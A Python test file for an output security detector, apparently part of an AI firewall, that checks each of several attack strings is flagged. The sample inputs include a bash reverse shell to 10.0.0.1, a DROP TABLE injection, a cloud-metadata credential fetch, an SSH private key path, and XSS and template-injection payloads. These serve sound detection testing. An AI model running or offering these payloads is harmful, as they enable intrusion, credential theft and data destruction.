from firewall.detectors.output_security import OutputSecurityDetector
from firewall.core.events import Actor, SecurityEvent


def _det(text: str):
    d = OutputSecurityDetector()
    ev = SecurityEvent(actor=Actor(), output_text=text)
    return d.scan(ev)


def test_sqli_union():
    ds = _det("SELECT * FROM users WHERE id=1 UNION SELECT password FROM secrets")
    assert any(x.subcategory == "sqli_union" for x in ds)


def test_sqli_stacked():
    ds = _det("1; DROP TABLE users; --")
    assert any(x.subcategory == "sqli_stacked" for x in ds)


def test_shell_reverse():
    ds = _det("Try: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert any(x.subcategory == "shell_reverse_shell" for x in ds)


def test_xss_svg_onload():
    ds = _det("<svg onload=alert(1)>")
    assert any(x.subcategory == "xss_svg_onload" for x in ds)


def test_ssrf_metadata():
    ds = _det("Fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    assert any(x.subcategory == "ssrf_metadata" for x in ds)


def test_path_ssh_keys():
    ds = _det("Read /root/.ssh/id_rsa")
    assert any(x.subcategory == "path_ssh_keys" for x in ds)


def test_ssti_jinja():
    ds = _det("{{ config.items() }}")
    assert any(x.subcategory == "ssti_jinja" for x in ds)


def test_benign_output_no_fp():
    ds = _det("Quarterly revenue rose 12 percent, driven by enterprise growth.")
    assert ds == []
